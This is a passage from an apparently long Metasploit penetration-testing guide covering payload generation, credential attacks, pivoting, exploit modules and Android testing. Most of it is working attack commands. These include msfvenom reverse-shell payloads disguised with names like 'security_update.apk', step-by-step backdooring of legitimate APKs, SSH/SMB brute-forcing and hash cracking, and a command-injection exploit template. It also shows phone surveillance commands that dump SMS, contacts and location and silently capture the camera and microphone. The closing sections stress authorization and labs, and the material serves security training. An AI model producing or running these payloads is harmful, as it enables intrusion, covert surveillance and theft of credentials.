
#### B. Linux Binaries (ELF)
```bash
# Linux 64-bit Reverse TCP ELF Binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o audit_agent.elf

# Linux ARM (Raspberry Pi / IoT devices)
msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o iot_agent.elf
```

#### C. Android Mobile Package (APK)
```bash
# Pure Android Meterpreter Standalone APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o security_update.apk

# Android Meterpreter HTTPS APK (Encrypted C2 Channel)
msfvenom -p android/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=8443 -o update_service.apk
```

#### D. Web Shells & Application Archives
```bash
# PHP Single Reverse Shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o webshell.php

# Java WAR File (Apache Tomcat / JBoss / WebLogic deployment)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o backup_service.war

# ASPX Shell (Microsoft IIS Web Servers)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx
```

#### E. Exploit Development Shellcode Formats
```bash
# C Shellcode Array for Custom Exploit C Files
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00\x0a\x0d" -f c

# Python Shellcode String
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00" -f py -v sc
```

---

### 11.3 Bad Characters & Encoding Realities

When exploiting memory corruption vulnerabilities (e.g., stack-based buffer overflows), specific characters terminate or corrupt memory strings:
- `\x00` (Null Byte): String termination in C/C++.
- `\x0a` (Line Feed `\n`): Terminates input in FTP/HTTP/SMTP protocols.
- `\x0d` (Carriage Return `\r`): Terminates input in network buffers.

To instruct `msfvenom` to rewrite shellcode without these bytes:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00\x0a\x0d\x20" -f c
```

> [!WARNING]
> **The Realities of Encoders and Modern Antivirus/EDR**:
> Historically, security practitioners used encoders like `x86/shikata_ga_nai` to evade antivirus. Today, **modern endpoint protection tools (Defender, CrowdStrike, SentinelOne) do NOT rely solely on static shellcode signatures**. They analyze the executable's stub, entropy, imported APIs (`VirtualAlloc`, `WriteProcessMemory`), parent-child process anomalies, and runtime behavior (AMSI). Multiple iterations of Shikata_ga_nai (`-i 10`) actually **increase** the file's entropy, making it *more* suspicious to modern heuristic engines. True AV evasion requires custom loaders, API unhooking, and runtime decryption.

---

## 12. Auxiliary Scanners, Authentication & Credential Auditing

### 12.1 Authentication Auditing Modules

Metasploit includes industrial-grade authentication brute-forcing and dictionary auditing modules:

```text
# SSH Authentication Auditing
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
msf6 auxiliary(scanner/ssh/ssh_login) > run

# SMB / Active Directory Credential Testing
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/smb/smb_login) > set SMBDomain CORP
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /root/passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > run
```

### 12.2 Credential Storage & Database Inspection
Any credential discovered via login modules or dumped via Meterpreter is automatically organized in the database:

```text
msf6 > creds
Credentials
===========
host           port  proto  service  user           password        realm
----           ----  -----  -------  ----           --------        -----
192.168.1.10   445   tcp    smb      administrator  Password123!    CORP
192.168.1.25   22    tcp    ssh      deployer       id_rsa (ssh-key)
192.168.1.120  445   tcp    smb      Administrator  aad3b435b...:e19ccf7aa04c...
```

### 12.3 Exporting & Cracking Hashes
```bash
# Dump NTLM hashes to file and crack with Hashcat
hashcat -m 1000 -a 0 /root/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -O

# Dump Linux /etc/shadow hashes and crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt /root/shadow_hashes.txt
```

---

## 13. Database & Workspace Management

### 13.1 Database Management Commands

| Command | Action Performed | Practical Pentest Usage |
|---|---|---|
| `db_status` | Verifies PostgreSQL connectivity. | Run at session launch to ensure data is persisting. |
| `workspace` | Lists, creates, and switches project workspaces. | Isolates data between different company assessments. |
| `db_nmap` | Runs Nmap and automatically imports findings into DB. | `db_nmap -sS -sV -O 192.168.1.0/24`. |
| `hosts` | Displays discovered hosts, OS versions, and status. | Filter by OS: `hosts -c address,os_name -S "Windows"`. |
| `services` | Displays discovered open ports and service banners. | Filter by service: `services -p 445 --up`. |
| `vulns` | Displays identified vulnerabilities mapped to hosts. | Shows CVEs confirmed via `check` or external scans. |
| `loot` | Displays all captured files, configs, and SAM dumps. | View downloaded evidence: `loot -t text`. |
| `notes` | Stores arbitrary analyst notes and operational logs. | Documenting findings: `notes -a 192.168.1.10 -n "RDP open"`. |

### 13.2 Importing External Vulnerability Scanners
Metasploit seamlessly parses scan results from enterprise vulnerability scanners:
```text
# Import Nmap XML scan
msf6 > db_import /root/scans/nmap_external.xml

# Import Tenable Nessus scan file
msf6 > db_import /root/scans/nessus_corp_assessment.nessus

# Import Nexpose / InsightVM or Qualys scan
msf6 > db_import /root/scans/qualys_export.xml
```

---

## 14. Network Pivoting & Lateral Movement

### 14.1 The Concept of Network Pivoting

```
┌─────────────────┐
│ Attacker (Kali) │
│ 192.168.1.50    │
└────────┬────────┘
         │ External / DMZ Network (192.168.1.0/24)
         ▼
┌─────────────────────────────────┐
│ Compromised Dual-Homed Server   │
│ Eth0: 192.168.1.120 (Public/DMZ)│  <==== PIVOT HOST (Session 1)
│ Eth1: 10.10.10.15   (Internal)  │
└────────────────┬────────────────┘
                 │ Internal Isolated Network (10.10.10.0/24)
                 │ (Directly unreachable from Attacker Machine)
                 ▼
        ┌───────────────────┐
        │ Target Internal   │
        │ Domain Controller │
        │ 10.10.10.100      │
        └───────────────────┘
```

When an engagement requires reaching an isolated internal subnet (e.g. `10.10.10.0/24`) through a compromised machine with two network interfaces:

### 14.2 Routing Subnets via Metasploit
```text
# Step 1: Add internal route pointing through active Session 1
msf6 > route add 10.10.10.0 255.255.255.0 1
[*] Route added: 10.10.10.0/255.255.255.0 -> Session 1

# Or use the automated AutoRoute post module:
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > run

# Step 2: Print routing table to confirm
msf6 > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1
```

Now any auxiliary scanner or exploit executed in Metasploit targeting `10.10.10.x` will transparently route through Session 1!

### 14.3 SOCKS Proxy & Proxychains Integration
To route external Linux tools (Nmap, curl, Firefox, SQLMap) through the Metasploit pivot:

```text
# Step 1: Start Metasploit SOCKS5 Proxy Server
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
```

Configure `/etc/proxychains4.conf` on your Kali machine:
```ini
[ProxyList]
socks5 127.0.0.1 1080
```

Now run any tool through the compromised pivot host:
```bash
proxychains4 nmap -sT -Pn -p 22,80,445 10.10.10.100
proxychains4 curl http://10.10.10.100:8080/admin
```

### 14.4 Meterpreter Port Forwarding
Port forwarding exposes a single port on an internal machine directly to your local attacker machine:

```text
# Forward local port 33890 to internal host 10.10.10.100 port 3389 (RDP)
meterpreter > portfwd add -l 33890 -p 3389 -r 10.10.10.100
[*] Local TCP relay created: :33890 <-> 10.10.10.100:3389

# Connect locally from your Kali terminal:
$ rdesktop 127.0.0.1:33890
```

---

## 15. Exploit Development & Custom Ruby Modules

### 15.1 Anatomy of a Metasploit Ruby Module

All Metasploit modules are written in object-oriented **Ruby** and inherit from base classes in the `Msf` namespace:

```ruby
##
# Custom Metasploit Remote Exploit Template
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Enterprise Web Portal Unauthenticated RCE',
      'Description'    => %q{
        This module exploits an unauthenticated command injection vulnerability
        in Enterprise Web Portal versions 4.0 to 4.5 via the /api/ping endpoint.
      },
      'Author'         => ['Security Researcher <researcher@security.lab>'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2026-1337'],
        ['URL', 'https://security.lab/advisory/2026-1337']
      ],
      'Platform'       => 'linux',
      'Targets'        => [
        ['Automatic Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' }]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2026-03-15'
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'Base path to web portal', '/'])
    ])
  end

  def check
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'api', 'version'),
      'method' => 'GET'
    })

    if res && res.code == 200 && res.body.include?('EnterprisePortal 4.2')
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Transmitting malicious command payload...")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'api', 'ping'),
      'method'    => 'POST',
      'vars_post' => {
        'ip' => "; #{payload.encoded} #"
      }
    })
  end
end
```

### 15.2 Buffer Overflow Development Utilities
Metasploit includes specialized command-line tools for calculating stack and memory offsets:

```bash
# 1. Generate unique cyclical pattern of 5000 bytes
msf-pattern_create -l 5000 > pattern.txt

# 2. Inject pattern into application crash buffer and observe crash in debugger (e.g. x64dbg/GDB)
# EIP/RIP overwritten with: 0x39694438 ("8Di9")

# 3. Calculate exact offset to EIP/RIP
msf-pattern_offset -q 0x39694438 -l 5000
# [*] Exact match at offset 2064

# 4. Find opcode equivalents using nasm_shell (e.g. JMP ESP instruction)
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
```

---

## 16. Android Penetration Testing with Metasploit

### 16.1 Android Architecture & Mobile Attack Surface

Testing Android mobile applications with Metasploit requires understanding how the Android operating system enforces isolation and sandboxing:

```
┌────────────────────────────────────────────────────────────────────────┐
│                        ANDROID APPLICATION LAYER                       │
│  Target App / Backdoored APK (Sandboxed User UID: e.g., u0_a142)       │
├────────────────────────────────────────────────────────────────────────┤
│                     DALVIK / ART RUNTIME LAYER                         │
│  Bytecode Execution (.dex) │ com.metasploit.stage.Payload              │
├────────────────────────────────────────────────────────────────────────┤
│                     ANDROID NATIVE LIBRARIES                           │
│  Bionic libc │ WebKit │ SQLite │ Native .so shared objects             │
├────────────────────────────────────────────────────────────────────────┤
│                     LINUX KERNEL SECURITY LAYER                        │
│  SELinux Enforcing │ User Isolation │ Process Namespaces │ IPC Binders │
└────────────────────────────────────────────────────────────────────────┘
```

- **Application Sandboxing**: Each Android application runs under a unique Linux User ID (`u0_aXXX`). By default, an app cannot access another app's private files in `/data/data/<package_name>/`.
- **Dalvik / ART Execution**: Metasploit payloads for Android run as compiled Java bytecode inside Dalvik/ART virtual machine threads.
- **IPC Attack Vectors**: Activities, Services, Broadcast Receivers, and Content Providers can expose entry points if exported without permissions.

---

### 16.2 Android Payload Generation Recipes

Metasploit provides specialized payloads for Android devices running Dalvik/ART runtimes:

```bash
# 1. Pure Standalone Android Reverse TCP Meterpreter APK
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 \
  LPORT=4444 \
  -o bank_security_agent.apk

# 2. Pure Standalone Android Reverse HTTPS Meterpreter APK (Encrypted TLS C2)
msfvenom -p android/meterpreter/reverse_https \
  LHOST=192.168.1.50 \
  LPORT=8443 \
  -o bank_security_agent_https.apk
```

---

### 16.3 Injecting Payloads into Legitimate APKs (Backdooring)

To perform authorized social engineering assessments or dynamic runtime testing, security researchers embed Metasploit payloads directly into legitimate, benign APKs:

#### Method A: Automated Injection via msfvenom
```bash
# Inject payload directly into an existing legitimate APK
msfvenom -x LegitimateCalculator.apk \
  -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 \
  LPORT=4444 \
  -o Calculator_Backdoored.apk
```

#### Method B: Manual Smali Injection Workflow (Maximum Reliability)
When automated injection fails due to ProGuard obfuscation or multidex configurations:
1. **Decompile benign APK**:
   ```bash
   apktool d TargetApp.apk -o TargetApp_decompiled
   ```
2. **Generate raw payload and decompile**:
   ```bash
   msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk
   apktool d payload.apk -o payload_decompiled
   ```
3. **Copy Metasploit Smali classes**:
   ```bash
   cp -r payload_decompiled/smali/com/metasploit/ TargetApp_decompiled/smali/com/
   ```
4. **Hook Launcher Activity**: Locate the main entry Activity defined in `AndroidManifest.xml` and insert the payload service trigger into `onCreate()`:
   ```smali
   invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
   ```
5. **Merge Permissions**: Add `INTERNET`, `ACCESS_NETWORK_STATE`, and required permissions to `AndroidManifest.xml`.
6. **Rebuild, Align, and Sign**:
   ```bash
   apktool b TargetApp_decompiled -o TargetApp_rebuilt.apk
   zipalign -v -p 4 TargetApp_rebuilt.apk TargetApp_aligned.apk
   apksigner sign --ks release.keystore --ks-key-alias alias_name TargetApp_aligned.apk
   ```

---

### 16.4 Complete Android Meterpreter Command Reference

When an Android Meterpreter session connects, a specialized set of mobile-specific commands becomes available:

| Command | Category | Technical Description & Practical Use Case |
|---|---|---|
| `check_root` | System / Priv | Checks if device has `su` binary or unconstrained root access. |
| `dump_contacts` | Data Harvest | Extracts all telephone contacts, emails, and names to a `.vcf` file. |
| `dump_sms` | Data Harvest | Dumps all incoming, outgoing, and draft SMS text messages to a `.txt` file. |
| `dump_calllog` | Data Harvest | Extracts incoming, outgoing, and missed call logs with timestamps. |
| `geolocate` | Surveillance | Queries GPS, Wi-Fi, and cellular towers to pinpoint physical coordinates. |
| `wlan_geolocate` | Surveillance | Uses nearby BSSIDs and Google Location API for indoor positioning. |
| `send_sms` | Interaction | Transmits SMS from the target phone: `send_sms -d +123456789 -t "Security Alert"`. |
| `webcam_list` | Hardware | Lists all available cameras (e.g. `Camera 0: Back`, `Camera 1: Front`). |
| `webcam_snap` | Surveillance | Captures a silent photo: `webcam_snap 1` (front selfie camera). |
| `webcam_stream` | Surveillance | Streams live video feed directly into a local web browser interface. |
| `record_mic` | Audio | Records ambient sound through device microphone: `record_mic -d 30`. |
| `app_list` | Inspection | Lists all installed package names and system apps. |
| `app_run` | Execution | Starts an app: `app_run com.android.chrome`. |
| `app_uninstall` | System | Removes an installed package: `app_uninstall com.target.bank`. |
| `interval_collect`| Persistence | Periodically captures SMS, call logs, and locations at intervals. |

#### Real-World Android Meterpreter Interactive Session:
```text
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending stage (77382 bytes) to 192.168.1.135
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.135:48201)

meterpreter > sysinfo
OS: Android 13 - Linux 5.10.136 (aarch64)
Meterpreter: java/android

meterpreter > check_root
[*] Device is not rooted.

meterpreter > geolocate
[*] Fetching location coordinates...
Latitude:  37.774929
Longitude: -122.419418
Google Maps URL: https://maps.google.com/?q=37.774929,-122.419418

meterpreter > dump_sms
[*] Fetching 184 SMS messages...
[+] SMS dumped to /root/.msf4/loot/sms_dump_20261104.txt

meterpreter > dump_contacts
[*] Fetching 512 contacts...
[+] Contacts dumped to /root/.msf4/loot/contacts_dump_20261104.vcf
```

---

### 16.5 Integrating Metasploit with the Android Pentest Ecosystem

Metasploit does not exist in isolation; it integrates into the mobile security toolchain:

```
┌────────────────────────────────────────────────────────────────────────┐
│               UNIFIED ANDROID PENTESTING WORKFLOW                      │
├────────────────────────────────────────────────────────────────────────┤
│  1. MobSF SAST/DAST  ──>  Static triage: identify exposed permissions  │
│  2. JADX Decompiler  ──>  Reverse engineer payload classes & hooks     │
│  3. APKTool          ──>  Disassemble, inject smali hook, rebuild APK  │
│  4. ADB              ──>  Deploy & run APK, inspect logcat, set proxies│
│  5. Frida            ──>  Bypass SSL pinning & root detection at runtime│
│  6. Metasploit       ──>  Catch interactive Meterpreter C2 session     │
└────────────────────────────────────────────────────────────────────────┘
```

1. **MobSF**: Upload backdoored APKs to analyze how static security scanners score Metasploit’s `com.metasploit.stage.Payload` service and permissions.
2. **JADX**: Decompile the APK to examine how Metasploit’s Dalvik stager establishes reflective class loading and validates SSL certificates.
3. **Frida**: When testing hardened mobile applications, Frida hooks can bypass root detection and SSL certificate pinning that would otherwise block the Metasploit payload from communicating.
4. **APKTool**: Disassemble and reassemble APK files to embed payload triggers directly into launch activities.
5. **ADB**: Push the APK (`adb install -r app.apk`), grant permissions (`adb shell pm grant ...`), and trigger the main service (`adb shell am start-foreground-service ...`).

---

## 17. Tool Integration Masterclass

| Integrated Tool | Integration Point & Mechanism | Strategic Value in Engagements |
|---|---|---|
| **Nmap** | `db_nmap -sS -sV -O <targets>` | Scans hosts and automatically stores open ports and banners into the Metasploit PostgreSQL DB. |
| **Nessus** | `db_import <scan.nessus>` | Ingests vulnerability scan reports, mapping confirmed CVEs directly to Metasploit modules. |
| **Burp Suite** | Upstream Proxy / `set PROXY` | Routes Metasploit HTTP/HTTPS exploit traffic through Burp Suite for deep packet analysis and manual tampering. |
| **SQLMap** | `--os-shell` / Meterpreter Upgrade | Leverages SQL injection to drop an executable or web shell, subsequently upgraded to a full Meterpreter session. |
| **Ghidra / IDA Pro**| Binary Disassembly & Reversing | Identifies buffer overflow offsets, ROP gadget chains, and vulnerable functions to author custom MSF modules. |
| **Hashcat** | Extracted DB Credentials / Hashes | High-speed GPU cracking of SAM, Shadow, NTLM, and Kerberos credentials dumped by Meterpreter. |

---

## 18. Professional Penetration Testing Methodology & Reporting

### 18.1 The 11-Phase Penetration Testing Execution Standard (PTES)

```
[1. Scoping] ──> [2. Recon/OSINT] ──> [3. Threat Model] ──> [4. Vuln Scan]
                                                                  │
[8. PrivEsc] <── [7. Post-Exploit] <── [6. Exploitation] <── [5. Safe Check]
     │
     ▼
[9. Pivoting] ──> [10. Technical Report] ──> [11. Cleanup & Remediation]
```

1. **Pre-Engagement & Scoping**: Define exact IP ranges, in-scope domains, testing windows, and legal Rules of Engagement (RoE).
2. **Intelligence Gathering**: Perform passive OSINT, DNS brute-forcing, and employee enumeration.
3. **Threat Modeling**: Map attack paths, prioritize business-critical assets, and plan entry strategies.
4. **Vulnerability Analysis**: Run automated scanners (`auxiliary/scanner/*`, Nmap, Nessus) to discover weak services.
5. **Safe Verification (`check`)**: Execute module verification methods without triggering denial-of-service conditions.
6. **Exploitation & Initial Foothold**: Execute target-specific exploits or client-side payloads to gain unprivileged sessions.
7. **Post-Exploitation & System Audit**: Gather host information, inspect permissions, review sensitive configuration files.
8. **Privilege Escalation**: Elevate session to root or `NT AUTHORITY\SYSTEM` using kernel, configuration, or token exploits.
9. **Internal Reconnaissance & Pivoting**: Route through compromised dual-homed hosts to audit isolated corporate subnets.
10. **Reporting & Documentation**: Provide executive summaries, technical reproductions, CVSS scores, and remediation steps.
11. **Cleanup**: Terminate handlers, remove injected binaries, restore modified files, and purge test accounts.

---

### 18.2 Professional Technical Vulnerability Finding Template

```markdown
### Finding SEC-01: Remote Code Execution via Unauthenticated SMBv1 (MS17-010)

- **Vulnerability Title**: Remote Code Execution in Microsoft SMBv1 Server
- **Severity**: Critical (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Affected Host**: `192.168.1.120` (Internal Accounting File Server)
- **CVE Reference**: CVE-2017-0144 (MS17-010)

#### Technical Description
The target host is running an outdated version of Microsoft SMBv1 that fails to properly handle crafted Snd_Transaction2 requests, permitting unauthenticated remote attackers to execute arbitrary shellcode in ring-0 kernel memory.

#### Reproduction Steps (Proof of Concept)
1. Verify vulnerability safely using Metasploit auxiliary scanner:
   ```text
   msf6 > use auxiliary/scanner/smb/smb_ms17_010
   msf6 auxiliary(...) > set RHOSTS 192.168.1.120
   msf6 auxiliary(...) > run
   [+] 192.168.1.120:445 - Host is likely VULNERABLE to MS17-010!
   ```
2. Demonstrate command execution impact using the official exploit module:
   ```text
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   msf6 exploit(...) > set RHOSTS 192.168.1.120
   msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   msf6 exploit(...) > exploit
   meterpreter > getuid
   Server username: NT AUTHORITY\SYSTEM
   ```

#### Business Impact
Complete, unauthenticated compromise of the accounting server, enabling full access to financial spreadsheets, customer PII, and lateral movement across the internal Active Directory domain.

#### Remediation Guidance
1. Disable SMBv1 across all endpoints and servers via Group Policy:
   `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`
2. Apply Microsoft Security Bulletin MS17-010 security rollup update immediately.
3. Block inbound TCP port 445 on perimeter firewalls.
```

---

## 19. Practical Labs & 10-Tier Learning Roadmap

### 19.1 Authorized Practice Environments

Never practice against unauthorized targets. Set up safe, legal virtualization labs:

- **Metasploitable 2 (Linux)**: Intentionally vulnerable Ubuntu Linux VM with 20+ vulnerable services (vsftpd backdoor, DistCC RCE, Samba flaws, outdated PHP).
- **Metasploitable 3 (Windows & Ubuntu)**: Automated Vagrant environment with realistic, multi-layered vulnerabilities simulating an enterprise Active Directory domain.
- **VulnHub VMs**: Kioptrix series, Mr. Robot, SickOS, and Prime.
- **Hack The Box (HTB) & TryHackMe (THM)**: Dedicated Metasploit learning modules and practice boxes (e.g. Blue, Legacy, Kenobi).

---

### 19.2 The 10-Tier Progressive Mastery Roadmap

```
Tier 10: Elite Exploit Developer (Custom memory corruption modules, ROP chains)
   ▲
Tier 9:  Mobile & IoT Security Researcher (Android APK injection, Smali hooks)
   ▲
Tier 8:  Network Pivoting & Enterprise Lateral Movement (SOCKS5, portfwd)
   ▲
Tier 7:  Active Directory & Domain Compromise (Kiwi, Mimikatz, DCSync)
   ▲
Tier 6:  Post-Exploitation & Privilege Escalation (UAC bypass, token stealing)
   ▲
Tier 5:  Meterpreter Master (In-memory execution, process migration, loot)
   ▲
Tier 4:  Payload Engineering with msfvenom (Multi-platform, badchars, encodings)
   ▲
Tier 3:  Exploitation Mechanics & Handlers (Reverse vs Bind, exploit ranking)
   ▲
Tier 2:  Reconnaissance & Auxiliary Scanners (Service fingerprinting, DB import)
   ▲
Tier 1:  Foundations & Console Navigation (msfconsole, syntax, msfdb setup)
```

### 19.3 Legal Compliance & Rules of Engagement

1. **Authorization**: Always secure written, signed **Rules of Engagement (RoE)** from the system owner before executing any auxiliary scanner or exploit.
2. **Production Safety**: Never run exploits ranked below `Good` or DoS modules on production corporate environments.
3. **Data Integrity**: Store extracted client credentials (`creds`) and downloaded artifacts (`loot`) on encrypted volumes, and securely shred all data post-engagement.
4. **Scope Adherence**: Strictly respect out-of-scope IP addresses and third-party SaaS infrastructure.
